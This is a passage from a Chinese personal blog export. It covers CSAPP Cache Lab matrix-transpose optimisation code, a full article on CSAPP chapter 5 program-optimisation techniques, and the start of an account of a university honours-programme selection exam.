为 1412，距离满分还差一点距离。\n\n后续实验就遇到了瓶颈。经过观察，我们发现，如果把 $64\\times 64$ 的矩阵按 $8\\times 8$ 划分之后\n\n![](http://pic.caiwen.work/i/2025/08/06/689330d373dfe.png)\n\n非对角线上，置换前后位置使用的是不同的缓存组，而对角线上则相反。因此，很多 misses 是由于对角线上置换导致的冲突不命中。\n\n一个对角线块上，会进行两次对于 $8\\times 4$ 分块的运算。每次处理 $8\\times 4$ 分块都会带来大约 $(4 + 1) + (1 + 1) \\times 7=19$ 的缓存不命中次数。那么一个对角线块就产生 $38$ 次缓存不命中。\n\n接下来的关注点就在于如何科学地处理对角线块。中间我试了很多种神奇的处理方式，但经过计算和代码验证都不如目前的 $8\\times 4$ 分块。\n\n想了很久之后我突然有一个想法，我们能否把一个对角线块置换后的结果先放入 B 中的一个区域中，然后再把这个区域复制到其正确的位置上。这个区域就充当一个中转功能，并且由于使用和对角线块不同的缓存组，缓存的冲突不命中次数将会很低。\n\n后来经过尝试发现，我们不能直接把对角线块的置换结果放入中转区域，因为我们按行读对角线块的时候，中转区域是按列方向，反复对 $8$ 行进行写入，这会和 $8\\times 8$ 分块一样带来严重的冲突不命中。\n\n不过后续我很快想到了解决方案，我们可以选定两个 $4\\times 8$ 的中转区域，然后把对角线块按 $4\\times 4$ 划分成四个区域，将置换结果放入中转区域中。这样做的话，对于每个对角线块，我们只会带来 $8+8+8=24$ 个缓存不命中。实际上，由于我们会反复利用同一个中转区域，后续由于写中转区域所带来的缓存不命中基本没有。同时我们合理调整写入顺序的话，缓存不命中次数还能更少。\n\n这里我选择前 $4$ 行最靠右的两个区域作为中转区域：\n\n![](http://pic.caiwen.work/i/2025/08/06/6893375a873df.png)\n\n注意转置的时候我们是一行一行的来，因为 AB 和 CD 之间的使用同一个缓存组。从中转区域复制回来的时候要先复制下面一行，因为我们之前是后处理下面一行的，这样还能利用上之前的缓存。\n\n不过这样会有个问题，就是当处理倒数两个对角线块的时候，对角线块使用的缓存组和中转区域的缓存组冲突，会导致严重的冲突不命中。所以我们需要特殊处理，改为选用别的中转区域来处理最后两个对角线块\n\n```c\n    int col, row, now = 0, p, e1, e2, e3, e4, e5, e6, e7, e8;\n    // 单独处理对角块\n    // 我们选择前 8 行的后 16 列作为中转块\n    for (p = 0; p < N - 16; p += 8) {\n        // 左上\n        for (row = p; row < p + 4; row ++) {\n            for (col = p; col < p + 4; col ++) {\n                now = A[row][col];\n                B[col - p][row - p + 48] = now;\n            }\n        }\n        // 右上\n        for (row = p; row < p + 4; row ++) {\n            for (col = p + 4; col < p + 8; col ++) {\n                now = A[row][col];\n                B[col - p - 4][row - p + 48 + 4] = now;\n            }\n        }\n        // 左下\n        for (row = p + 4; row < p + 8; row ++) {\n            for (col = p; col < p + 4; col ++) {\n                now = A[row][col];\n                B[col - p][row - p + 56 - 4] = now;\n            }\n        }\n        // 右下\n        for (row = p + 4; row < p + 8; row ++) {\n            for (col = p + 4; col < p + 8; col ++) {\n                now = A[row][col];\n                B[col - p - 4][row - p + 56] = now;\n            }\n        }\n        // 然后复制回来\n        // B\n        for (row = 0; row < 4; row ++) {\n            for (col = 48 + 4; col < 48 + 8; col ++) {\n                now = B[row][col];\n                B[row + p + 4][col - 48 + p - 4] = now;\n            }\n        }\n        // D\n        for (row = 0; row < 4; row ++) {\n            for (col = 56 + 4; col < 56 + 8; col ++) {\n                now = B[row][col];\n                B[row + p + 4][col - 56 + p] = now;\n            }\n        }\n        // A\n        for (row = 0; row < 4; row ++) {\n            for (col = 48; col < 48 + 4; col ++) {\n                now = B[row][col];\n                B[row + p][col - 48 + p] = now;\n            }\n        }\n        // C\n        for (row = 0; row < 4; row ++) {\n            for (col = 56; col < 56 + 4; col ++) {\n                now = B[row][col];\n                B[row + p][col - 56 + p + 4] = now;\n            }\n        }\n    }\n    // 最后两个对角线需要再特殊处理一下\n    for (p = N - 16; p < N; p += 8) {\n        // 左上\n        for (row = p; row < p + 4; row ++) {\n            for (col = p; col < p + 4; col ++) {\n                now = A[row][col];\n                B[col - p][row - p + 8] = now;\n            }\n        }\n        // 右上\n        for (row = p; row < p + 4; row ++) {\n            for (col = p + 4; col < p + 8; col ++) {\n                now = A[row][col];\n                B[col - p - 4][row - p + 8 + 4] = now;\n            }\n        }\n        // 左下\n        for (row = p + 4; row < p + 8; row ++) {\n            for (col = p; col < p + 4; col ++) {\n                now = A[row][col];\n                B[col - p][row - p + 16 - 4] = now;\n            }\n        }\n        // 右下\n        for (row = p + 4; row < p + 8; row ++) {\n            for (col = p + 4; col < p + 8; col ++) {\n                now = A[row][col];\n                B[col - p - 4][row - p + 16] = now;\n            }\n        }\n        // 然后复制回来\n        // B\n        for (row = 0; row < 4; row ++) {\n            for (col = 8 + 4; col < 8 + 8; col ++) {\n                now = B[row][col];\n                B[row + p + 4][col - 8 + p - 4] = now;\n            }\n        }\n        // D\n        for (row = 0; row < 4; row ++) {\n            for (col = 16 + 4; col < 16 + 8; col ++) {\n                now = B[row][col];\n                B[row + p + 4][col - 16 + p] = now;\n            }\n        }\n        // A\n        for (row = 0; row < 4; row ++) {\n            for (col = 8; col < 8 + 4; col ++) {\n                now = B[row][col];\n                B[row + p][col - 8 + p] = now;\n            }\n        }\n        // C\n        for (row = 0; row < 4; row ++) {\n            for (col = 16; col < 16 + 4; col ++) {\n                now = B[row][col];\n                B[row + p][col - 16 + p + 4] = now;\n            }\n        }\n    }\n    for (row = 0; row < N; row += 8) {\n        // 对角线之前\n        now = 0;\n        for (col = 0; col < row; col += 4) {\n            for (now? (p = 8 - 1) : (p = 0); now? (p >= 0) : (p < 8); now? (p -= 2) : (p += 2)) {\n                e1 = A[row + p][col];\n                e2 = A[row + p][col + 1];\n                e3 = A[row + p][col + 2];\n                e4 = A[row + p][col + 3];\n                e5 = A[row + p + (now? -1:1)][col];\n                e6 = A[row + p + (now? -1:1)][col + 1];\n                e7 = A[row + p + (now? -1:1)][col + 2];\n                e8 = A[row + p + (now? -1:1)][col + 3];\n                B[col][row + p] = e1;\n                B[col + 1][row + p] = e2;\n                B[col + 2][row + p] = e3;\n                B[col + 3][row + p] = e4;\n                B[col][row + p + (now? -1:1)] = e5;\n                B[col + 1][row + p + (now? -1:1)] = e6;\n                B[col + 2][row + p + (now? -1:1)] = e7;\n                B[col + 3][row + p + (now? -1:1)] = e8;\n            }\n            now = 1 - now;\n        }\n        // 对角线之后\n        for (col = row + 8; col < M; col += 4) {\n            for (now? (p = 8 - 1) : (p = 0); now? (p >= 0) : (p < 8); now? (p -= 2) : (p += 2)) {\n                e1 = A[row + p][col];\n                e2 = A[row + p][col + 1];\n                e3 = A[row + p][col + 2];\n                e4 = A[row + p][col + 3];\n                e5 = A[row + p + (now? -1:1)][col];\n                e6 = A[row + p + (now? -1:1)][col + 1];\n                e7 = A[row + p + (now? -1:1)][col + 2];\n                e8 = A[row + p + (now? -1:1)][col + 3];\n                B[col][row + p] = e1;\n                B[col + 1][row + p] = e2;\n                B[col + 2][row + p] = e3;\n                B[col + 3][row + p] = e4;\n                B[col][row + p + (now? -1:1)] = e5;\n                B[col + 1][row + p + (now? -1:1)] = e6;\n                B[col + 2][row + p + (now? -1:1)] = e7;\n                B[col + 3][row + p + (now? -1:1)] = e8;\n            }\n            now = 1 - now;\n        }\n    }\n```\n\nmisses 只有 1268，获得满分\n\n#### 61 x 67\n\n感觉这种情况下，矩阵每个位置使用的缓存组很没有规律。我甚至还用 react 画了一下分布情况：\n\n![](http://pic.caiwen.work/i/2025/08/06/689356732e597.png)\n\n果然很没有规律。\n\n我考虑直接沿用之前的 $8\\times 8$ 的分块，之后整个矩阵还有最右边和最下面有一块没有覆盖到。再单独开一个循环处理。处理最右边的部分时我们逐行处理，处理最下面的部分时我们逐列处理。这样做的 misses 为 2066，很接近满分。\n\n于是我又试了一下其他大小的分块，效果都没有 $8\\times 8$ 的好。考虑到目前已经开了 $11$ 个变量，于是打算把 $12$ 个变量的限制用满，再开一个变量，搞个 $9\\times 9$ 的分块：\n\n```c\nconst int BLOCK_N = 9;\nconst int BLOCK_M = 9;\nconst int LIMIT_N = 61 / BLOCK_N * BLOCK_N;\nconst int LIMIT_M = 67 / BLOCK_M * BLOCK_M;\n//const int REM_N = 61 - LIMIT_N;\n//const int REM_M = 67 - LIMIT_M;\nint col, row, p, e1, e2, e3, e4, e5, e6, e7, e8, e9;\nfor (row = 0; row < LIMIT_N; row += BLOCK_N) {\n    for (col = 0; col < LIMIT_M; col += BLOCK_M) {\n        for (p = 0; p < BLOCK_N; p ++) {\n            e1 = A[row + p][col];\n            e2 = A[row + p][col + 1];\n            e3 = A[row + p][col + 2];\n            e4 = A[row + p][col + 3];\n            e5 = A[row + p][col + 4];\n            e6 = A[row + p][col + 5];\n            e7 = A[row + p][col + 6];\n            e8 = A[row + p][col + 7];\n            e9 = A[row + p][col + 8];\n            B[col][row + p] = e1;\n            B[col + 1][row + p] = e2;\n            B[col + 2][row + p] = e3;\n            B[col + 3][row + p] = e4;\n            B[col + 4][row + p] = e5;\n            B[col + 5][row + p] = e6;\n            B[col + 6][row + p] = e7;\n            B[col + 7][row + p] = e8;\n            B[col + 8][row + p] = e9;\n        }\n    }\n}\nfor (row = 0; row < N; row++) {\n    for (col = LIMIT_M; col < M; col++) {\n        B[col][row] = A[row][col];\n    }\n}\nfor (col = 0; col < LIMIT_M; col ++){\n    for (row = LIMIT_N; row < N; row++) {\n        B[col][row] = A[row][col];\n    }\n}\n```\n\n结果 misses 直接到 1992，直接满分，比想象的简单（）\n\n（后来发现做反了，应该是 67 行，61 列，但是做法还是正确的）\n\n","summary":"本文介绍了计算机存储技术，包括SRAM、DRAM、ROM、磁盘和固态硬盘的工作原理与性能特点，以及CPU总线、缓存结构和程序如何利用缓存优化性能。通过Cache Lab实验展示了缓存优化对程序效率的提升。","key":["csapp","cache lab","缓存","存储"],"tags":[],"path":["os","csapp","CSAPP第六章 - 存储器层次结构.md"],"background":"http://pic.caiwen.work/i/2025/09/05/68baf76d55c95.png","recommend":false,"status":"published"},{"type":"Article","title":"CSAPP第五章 - 优化程序性能","id":"csapp-5","createTime":"2025-08-01T03:40:00.000Z","updateTime":"2025-09-24T14:23:44.793Z","content":"\n\n\n\n\n本章我们主要以优化一个求前缀和的函数为例子进行\n\n自己实现了一个 vector\n\n![](http://pic.caiwen.work/i/2025/07/31/688b3a060d094.png)\n\n![](http://pic.caiwen.work/i/2025/07/31/688b3a38374ee.png)\n\n然后我们会通过修改宏定义，对不同的数据类型进行前缀积和前缀和。\n\n![](http://pic.caiwen.work/i/2025/07/31/688b3a888472f.png)\n\n如求前缀和就可以定义 `IDENT` 为 `1`，`OP` 为 `*`\n\n## 1. 编译器优化\n\n### 1.1 调整优化等级\n\n通过设置 `-O1` 的优化等级就可以带来很大的提升\n\n![](http://pic.caiwen.work/i/2025/07/31/688b3b422b375.png)\n\n### 1.2 妨碍编译器优化\n\n编译器为了保证优化的正确性，一些可能看似正确的，但是会导致前后程序行为发生变化的优化是不会应用的\n\n#### 1.2.1 内存别名使用\n\n![](http://pic.caiwen.work/i/2025/07/31/688b3c018087e.png)\n\n比如上述的 `twiddle1` 和 `twiddle2` 看似行为是一样的，但是我们考虑，如果 `xp` 和 `yp` 两个指针指向的地址一样的话，`twiddle1` 会使得数据变为原来的 4 倍，而 `twiddle2` 会使得数据变为原来的 3 倍\n\n所以编译器在考虑代码优化时，总会假定不同的指针可能会指向内存的同一个位置。\n\n当然，如果我们自己知道一些情况不会发生，那么我们就可以通过一些关键字去提示编译器：\n\n* `restrict`：告诉编译器，被修饰的指针指向的内存只有自己这一个指针指向，没有别的指针指向。\n* `const`：告诉编译器，指针指向的内存只会读不会写。\n\n比如：\n\n![image-20250923174103673](https://api.file.caiwen.work/picture/2025/09/23/image-20250923174103673.png)\n\n上述代码，编译器就会认为 `x` 和 `y` 数组之间没有重叠，因此可以直接进行向量化的优化。\n\n当然有时候即使可能出现内存别名的情况，编译器也会尽力处理。比如上述代码如果不加 `restrict` 和 `const` 的话，编译器会生成如下的代码：判断 `x` 数组访问的范围和 `y` 数组访问的范围有无重合，有重合的话就不优化，否则进行向量化优化。\n\n#### 1.2.2 函数调用副作用\n\n![](http://pic.caiwen.work/i/2025/07/31/688b3d0fcc87e.png)\n\n上述的 `func1` 和 `func2` 也看似行为是一样的。但有可能 `f` 函数有副作用：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b3d54c165f.png)\n\n那么调用一次函数和调用四次函数，造成的结果是肯定不一样的。\n\n类似的例子还有：\n\n![image-20250923174328236](https://api.file.caiwen.work/picture/2025/09/23/image-20250923174328236.png)\n\n编译器不好说 `norm` 函数会不会有副作用，因此不会将其提出循环体。\n\n我们可以使用 `__attribute__((const))` 来提示编译器：\n\n![image-20250923174510723](https://api.file.caiwen.work/picture/2025/09/23/image-20250923174510723.png)\n\n#### 1.2.3 Unsigned 溢出\n\n如下的代码虽然已经加了 `restrict` 关键字，但是还是没有进行向量化优化：\n\n![image-20250923185357701](https://api.file.caiwen.work/picture/2025/09/23/image-20250923185357701.png)\n\n原因之一在于，`i` 和 `n` 都是无符号整数，并且 `i` 每次加 `4`，那么编译器就认为有可能出现无符号整数的溢出情况。无符号溢出会使得该整数变为 `0`，于是上述这个循环就会循环无穷多次。\n\n解决办法是把 `i` 和 `n` 改成有符号整数。这是因为在不同的架构上有符号整数溢出的行为不一样，于是编译器就假设有符号溢出永远不会发生，于是就进行了向量化优化。\n\n所以一般而言 `for` 循环的变量最好就用有符号整数，除非要进行位运算。\n\n## 2. 编码优化\n\n### 2.1 代码移动\n\n上面的 `combine1` 每次循环后都会调用 `vec_length`。而我们已经确定了 `vec_length` 是一个固定的值，所以我们可以写成这样：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b3e33f3777.png)\n\n这样的话我们只会调用一次 `vec_length`，提升如下：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b3e6eea7b2.png)\n\n像这种，会计算多次，但是每次计算的结果不变，于是我们可以把计算结果移动到不会多次求值的代码前，这种优化就叫做代码移动\n\n还有一个更能说明问题的例子。`strlen` 函数求一个字符串是 $O(n)$ 的，如果遍历一个字符串时，循环的条件中写了 `strlen` 的话，那么整个循环的复杂度就会增加到 $O(n^2)$，对代码效率的影响远不是 CPE 可以衡量的了\n\n编译器不会自动进行这种优化，原因是可能函数调用有副作用\n\n### 2.2 减少函数调用\n\n由于我们的 vector 本质上就是包裹了一下数组，所以 `get_vec_element` 可以被替换为先在循环外通过 `get_vec_start` 获得数组首地址之后然后再使用当前循环枚举的 `i` 来进行寻址：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b40398249e.png)\n\n这个改动减少了函数调用的次数。但是优化却很有限：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b406b9f539.png)\n\n### 2.3 减少内存引用\n\n进行内存读写需要消耗多个时钟周期，对性能影响较大。上面的 `combine3` 中，我们发现代码的第 10 行，首先将会从 `dest` 对应的内存中读数据，然后计算完成之后会把结果写回 `dest` 对应的内存中。这实际上是没有必要的，我们可以写成下面这样：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b411d89274.png)\n\n这样的话会先把计算结果积累在一个局部变量中，而这个局部变量应该是放在寄存器上的，对于寄存器的读写消耗的时钟周期较小。\n\n优化的结果如下：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b41b4576ce.png)\n\n编译器不会自动进行这个优化，如果 `dest` 指向的内存也是 vector 的一部分的话（内存别名引用）就会使得优化前后的行为不同。所以我们手动进行这个的优化的前提是我们确信使用函数时 `dest` 不会指向 `vector` 所在的区域\n\n## 3. 利用处理器架构优化\n\n### 3.1 现代处理器架构\n\n现代处理器是超标量的，特点是同一个周期内有多个指令在并行执行，并且是乱序执行的。\n\n![](http://pic.caiwen.work/i/2025/07/31/688b4412ab20c.png)\n\n整个设计大概是有两部分，ICU（指令控制单元）和 EU（执行单元）\n\nICU 中有一个指令高速缓存。通常 ICU 会提前进行取指，以留有足够的时间对指令进行译码。\n\n指令译码单元完成的工作比我们第四章流水线的译码阶段要复杂得多，其会将原始的指令分解成一组基本操作，每个基本操作都完成一个最基本的任务（从内存加载数据，写入数据到内存，进行运算等，类似精简指令集），于是处理器就可以并行地执行一条指令的不同部分。\n\n通常，EU 在每个周期会接收到来自 ICU 的多个操作，这些操作会被分派到相应的功能单元中，执行实际的操作。\n\n面对分支预测，现代处理器会有更加灵活的分支预测策略，并使用投机执行技术，即处理器预测分支后会实际地去执行这些指令。不过由于后续可能会存在预测错误，所以提前执行的指令不会真的去写寄存器或者内存，而是先将执行的结果放到退役单元。如果后面处理器判定预测正确，那么退役单元里未应用的操作将会被应用到寄存器文件中。反之，则会丢弃掉之前提前执行的指令产生的数据。\n\n由于只有判定预测正确之后才会将操作应用到寄存器文件，为了加快指令之间的数据交流，现代处理器还允许指令之间直接在 EU 中进行数据交换，其中一个技术是寄存器重命名。EU 中会维护一个重命名表，当有一个指令更新寄存器 `r` 时，就会产生一个标记 `t`，然后我们就把 `(r,t)` 放入这个表中，后续使用寄存器 `r` 的指令都会根据这个表转而使用 `t`。这有点类似于数据转发。\n\n### 3.2 性能分析\n\n现代处理器有多个功能单元，不同功能单元可以进行不同操作，一个功能单元也能整合不同的功能。Intel Core i7 Haswell 中有如下的 8 个功能单元，编号分别从 0 到 7：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b5f08accd4.png)\n\n根据 Intel 的数据，一些运算具有如下的性能参数（图中的单位为时钟周期）：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b5f97aa8b5.png)\n\n延迟表明完成单个运算需要的周期数，我们可以看到与浮点数相关的运算和除法运算是多周期指令。同时除法的延迟还是变化的，某些除数和被除数的组合可能比其他组合需要更多的步骤。\n\n发射时间是发射两个相同类型的指令之间所需的时间间隔。大多数指令的发射时间为 1，因为我们可以考虑流水线设计，即使只有一个功能单元，我们也可以不断地将指令发射到流水线，相邻指令之间还是有时间间隔，不会同时占用一个功能单元，因此发射时间为 1 的功能单元被称为完全流水线化的。对于除法运算，发射时间和延迟时间一致，这意味着除法器不是流水线化的，开启一个新的运算之前，上一个运算必须完全执行完毕。\n\n容量指的是有多少个可以进行特定运算的功能单元，也意味着我们可以同时发射多少个同类型的指令。\n\n发射时间的倒数就表明一个功能单元的最大吞吐量。由于我们可以有多个功能单元，所以如果定义容量为 $C$，发射时间为 $I$，那么这个类型的指令的最大吞吐量就为 $\\frac{C}{I}$\n\n我们有（图中的单位为 CPE）：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b635d1b989.png)\n\n上图的延迟表明延迟界限，即如果我的程序只利用了一个运算单元，且存在数据依赖（即上下一条指令要用到上一条指令的运算结果），能到达的最低 CPE 值。和延迟时间相同。\n\n上图的吞吐量表明吞吐量界限，即如果我的程序充分利用了所有的运算单元，且不存在数据依赖，能到达的最低 CPE 值。值和最大吞吐量相同。但是我们发现加法的吞吐量界限为 0.5 并非 0.25，这是由于我们还需要考虑到数据加载的瓶颈，而处理器只有两个加载单元，因此加法计算单元只能同时用两个。\n\n分析我们目前最快的 `combine4`，对比一下发现：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b6787546a7.png)\n\n已经很接近延迟界限，但是仍有一段距离。\n\n`combine4` 的循环部分对应的汇编代码如下：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b68128a9db.png)\n\n将指令拆分成基本操作，然后我们可以画出下面这种数据流图：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b684e6242e.png)\n\n重排一下：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b689078e2d.png)\n\n其中蓝色部分是关键部分。我们省略掉白色部分，然后再多拼接几个蓝色部分，得到：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b68dfa9fbf.png)\n\n我们可以看到整个循环大概是需要左边 $n$ 次的乘法计算，右边 $n$ 次的加法计算。其中乘法计算的延迟时间较大，所以左侧形成的路径是关键路径，对我们程序的效率起主要作用。\n\n上面 `combine4` 的 CPE 还未接近延迟界限（尤其是整数加法）的原因就在于右侧的非关键路径。而未接近吞吐量界限的原因就在于左边的关键路径。\n\n### 3.3 循环展开\n\n我们可以把原来的两次循环合并成一个循环，如：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b6a319d26f.png)\n\n我们管这种叫做 $2\\times 1$ 循环展开\n\n性能对比：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b6a89d7ec5.png)\n\n使用循环展开可以让我们减少非关键路径上的运算：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b6acc459de.png)\n\n这使得我们可以接近延迟界限。但关键路径上的运算数量没有减少，因此还是达不到吞吐量界限。\n\n### 3.4 提高并行性\n\n#### 3.4.1 多个累积变量\n\n现在我们的代码的数据相关性比较强，因为计算新的 `acc` 时还依赖于上一个 `acc`。数据相关导致，即使我发射时间很快，但是前面的指令算不完，后面的指令也无法向前推进。所以强的数据相关性会使我们的 CPE 最低只能到延迟界限。\n\n为了降低数据相关性，我们可以这么做，将奇数位置的数据积累到 `acc1` 上，偶数的积累到 `acc0` 上。由于更新 `acc0` 的时候不需要 `acc1` 更新完毕，反之亦然，因此我们就降低了数据相关性。\n\n![](http://pic.caiwen.work/i/2025/07/31/688b6c702c698.png)\n\n我们把这种两阶循环展开，积累到两路的变量，称为 $2\\times 2$ 循环展开\n\n比较一下性能：\n\n![](http://pic.caiwen.work/i/2025/07/31/688b6c9394ede.png)\n\n此时我们终于突破了延迟界限\n\n对于延迟为 L，容量为 C 的功能单元，使用 $k\\times k$ 阶循环展开且达到吞吐量界限的话，需要让 $k$ 取 $L\\cdot C$。感性理解是，虽然功能单元延迟是 $L$，但是如果功能单元是完全流水线化的话，我们需要一下发射 $L$ 条指令来填满流水线。如果有 $C$ 个相同的单元，我们就需要一下发射 $L\\cdot C$ 条指令。\n\n不过这种多路积累可能会有一些问题。比如给出的序列的奇数位置特别大，偶数位置接近于 0，那么在进行乘法的时候，`acc1` 可能会溢出，而正常进行循环的话一大一小相乘就会抵消。而且在第二章我们也说过，绝对值相差非常大的几个浮点数之间进行乘法操作，不同的乘法顺序会产生不同的结果。这些都会使得程序的行为发生变化。\n\n#### 3.4.2 重新结合变换\n\n我们把 `combine5` 的代码中的 `acc = (acc OP data[i]) OP data[i+1]` 改为 `acc = acc OP (data[i] OP data[i+1])` 的话，依然能够提高代码的并发性。只是改变了结合顺序，但是前者与 `data[i]` 计算完毕后才能继续与 `data[i+1]` 计算，下次循环与 `data[i+2]` 计算的时候还需要等等待前面与 `data[i+1]` 计算完毕。而后者则在 `data[i]` 与 `data[i+1]` 计算完毕之后可以立刻进行 `data[i+2]` 与 `data[i+3]` 的计算，由此消除了数据相关性，代码可以并行地执行。\n\n![](http://pic.caiwen.work/i/2025/08/01/688c205185d8c.png)\n\n书上有一个练习题能够帮助我们更好地去理解这个：\n\n![](http://pic.caiwen.work/i/2025/08/01/688c20a8d2859.png)\n\n其中五个不同的结合顺序的数据流图如下：\n\n![](http://pic.caiwen.work/i/2025/08/01/688c21c297835.png)\n\n显然其中 A1 的并行性极差，由于浮点乘法的延迟为 5，所以 A1 的 CPE 为 5。\n\nA2 和 A5 我们发现，前者的 `x*y` 和后者的 `y*z` 是独立于关键路径的，因此可以和关键路径并行计算，也就是两路的并行。关键路径上只有两个操作，因此 CPE 为原来的 $\\frac{2}{3}$，即 3.33\n\nA3 和 A4 相较于 A2 和 A5，又将一个运算从关键路径上拿走，CPE 为原来的 $\\frac{1}{3}$，即 1.67\n\n#### 3.4.3 内存相关\n\n上面的数据之间的相关联是发生在寄存器中的，实际上也可以发生在内存上。我们之前的代码由于读内存都是根据循环枚举的 `i` 进行寻址，所以关于内存的数据相关比较小。\n\n但我们考虑，如果现在，我们把原来的 vector 改为 list。list 的一个特点就是我们必须读到上一个元素才能获得下一个元素的地址然后读下一个元素，由此一来就产生了数据相关。这种情况下，代码的 CPE 会降到 4，因为 CPU 的 L1 cache 的访问速度是 4 周期\n\n我们再看这个代码：\n\n![](http://pic.caiwen.work/i/2025/08/01/688c31afee54d.png)\n\n如果 `dst` 和 `src` 不同的话，那么读写内存就无相关性，可以并行地执行。反之，在读 `src` 的时候需要等待 `dst` 完成写入，这就带来了数据相关性，导致这个实例的 CPE 达到了 7.3\n\n又比如：\n\n![](http://pic.caiwen.work/i/2025/08/01/688c3262b0cec.png)\n\nA 的 CPE 小，因为读的位置永远比写的位置靠后。B 的 CPE 大，因为每次读的位置都已经被写了一遍，需要等待先前写入操作完成，并行程度较差\n\n### 3.5 寄存器溢出\n\n我们循环展开时，积累的变量不能太多，比如：\n\n![](http://pic.caiwen.work/i/2025/08/01/688c247863606.png)\n\n我们使用了更高阶的循环展开和更多的累积变量，但是反而 CPE 升高。这是因为变量太多的话，编译器无法将全部的变量都分配到寄存器上，这样的话就会使得一些变量必须开在栈上，增加了内存引用。\n\n### 3.6 分支预测\n\n现代处理器的分支预测能力已经足够强了，大多数有规律的代码都可以被成功预测。所以这一点不应该是我们过度关心的。不过对于一些比较随机的情况，分支预测容易失败，且我们在第三章中提到如果分支预测错误的话需要撤销当前预测分支，这将会带来巨大的惩罚。所以我们需要考虑条件传送。\n\n这里我们是从 C 语言角度考虑优化的，而具体汇编代码是由编译器产生的。所以我们只能尽可能诱导编译器产生条件传送代码。一个比较好的办法是使用三目运算符：\n\n![](http://pic.caiwen.work/i/2025/08/01/688c283adf835.png)\n\n变为：\n\n![](http://pic.caiwen.work/i/2025/08/01/688c2850adf53.png)\n\n\n","summary":"本章以优化前缀和函数为例，介绍了编译器优化（如调整优化等级、避免内存别名和函数调用副作用）、编码优化（如代码移动、减少函数调用和内存引用）及处理器架构优化（如循环展开、并行累积和重新结合变换），以提升程序性能。","key":["csapp","优化","性能","循环展开","并行"],"tags":[],"path":["cs","csapp","CSAPP第五章 - 优化程序性能.md"],"background":"http://pic.caiwen.work/i/2025/09/05/68baf8da29300.png","recommend":false,"status":"published"},{"type":"Article","title":"湖南大学计算机拔尖计划游记","id":"hnu-bajian","createTime":"2025-07-28T11:13:00.000Z","updateTime":"2025-11-02T05:25:57.681Z","content":"\n## 前言\n\n本文介绍了本人在去年参加湖南大学拔尖计划选拔的全过程。内含与去年选拔相关的很多信息，希望可以提供给后人进行借鉴。\n\n## 机试前\n\n笔者在高中打过信息学竞赛，但高考成绩不理想，考虑来湖大转专业。早在 10 月初就认识了一个拔尖班的学长，了解了一下情况：计拔分机考和面试，机考有三个高数题和三个编程题，其中三个编程题占大约 80% 的分数。高数题都是选择题，并且偏计算（同时学长提了个技巧，在做高数题的时候面前是有电脑的，因此可以直接写程序来求极限或者积分之类的计算，这意味着这三个高数题大概率只是摆设）。面试首先是自我介绍，然后简单问一下，基本是走过场，每年最终排名和机考排名之间区别不大，面试并没有什么实际影响。\n\n最主要的三个编程题，学长表示他们那年前两题都是普及组难度（在 cf 上大概一个 800 分一个 1200 分的难度），最后一题出了个异或高斯消元的板子题，爆搜可以获得 70 分，题面如下：\n\n![](https://api.file.caiwen.work/picture/2025/11/02/image-20251102122704397.png)\n\n2023 年的机考成绩公示：https://www.caiwen.work/hnu-bajian-2023.pdf\n\n最后学长表示我想来肯定能来，但同时建议我正常转专业而并非走拔尖计划。\n\n后面还了解到 2022 年的最后一题甚至出了个读二进制数据的题目。\n\n在 12 月初我报名参加了 CCF CSP ，因为之前学长说 CSP 300 分基本是免面试的（他当时就大一上学期拿到了 300 多分，计拔面试自我介绍完就让走了），于是就报名参加。打的非常顺，前四道题都是一发过，最后一题打了个部分分，最终拿到 430 分。\n\n随后又打了把 Codeforces Div3，当作计拔考前信心赛，结果差点 AK，并上分到 1601 分，感觉胜券在握。\n\n机考前我还闲的没事把报名的人都给盒了一下：\n\n![左边是原专业，右边是获得的最高等级的奖项](https://api.file.caiwen.work/picture/2025/11/02/image-20251102123823578.png)\n\n（春季测试全国 rk39 的后面得知是重名的）\n\n感觉今年的压力会有点大。\n\n## 机试\n\n于是就来到了计拔机考。首先是三个高数题，感觉和前几年不一样，貌似只有第一个选择题是能直接使用 python 算出来的。于是拿 python 求完了第一题的极限之后就先跳过了后两个选择。\n\n编程题第一题大概意思是给你 n 个数字和一个 k ，要求你找出一个最大区间，使得区间和不大于 k（n 个数字均为正数）。当时一眼直接想到了前缀和转化，然后枚举左端点，右端点二分。写完之后交了一发还 wa 了。之前学长跟我说计拔的数据可能不开 long long，于是我就把 long long 关了，结果还是 wa。后来忘了怎么瞎改的 int 和 long long，给过了。\n\n第二题在后来得知是 leetcode 的原题，链接是：https://leetcode.cn/problems/candy/\n\n发现这个题貌似是一个月前计算机设计大赛的一个题，当时一个高中同学还问我，我看了一眼，感觉是离散化，就没管了。于是我先写了个离散化，写到一半发现离散化是假的。然后考虑贪心。不过题目貌似没说如果两个人权重相同该怎么去分，我还以为应该是分成一样的，于是直接把相邻且相同的数字给变成单个数字。于是后面换了好几个贪心方案都 wa 了（后来得知相同分数的两个人随便分，我这样做就使得无论如何我都做不出来了。Leetcode 上的原题有两个样例，其中的样例二就消除了这个歧义，但是计拔在搬题的时候把第二个样例删掉了）。此时还剩一小时的时间，非常焦虑。我最后突然想到题目的要求就是差分约束的限制，于是建图跑差分约束，但是只是过的点更多了一些，仍然是 wa。\n\n此时还剩半小时，前面的高数题还没做完，于是赶紧去做前面的高数。前面的高数题有点偏证明那种，不是直接算数的，无法直接用 python 算出来，我也没什么想法，于是就蒙了两个答案，然后再去看最后一题。\n\n最后一题看着也是非常熟悉，好像之前的一场 cf 的题，但是那个题当时写了一个链表，比较复杂，而目前时间还有十几分钟，大概率写不完了。于是草草写了一个做法，仍然 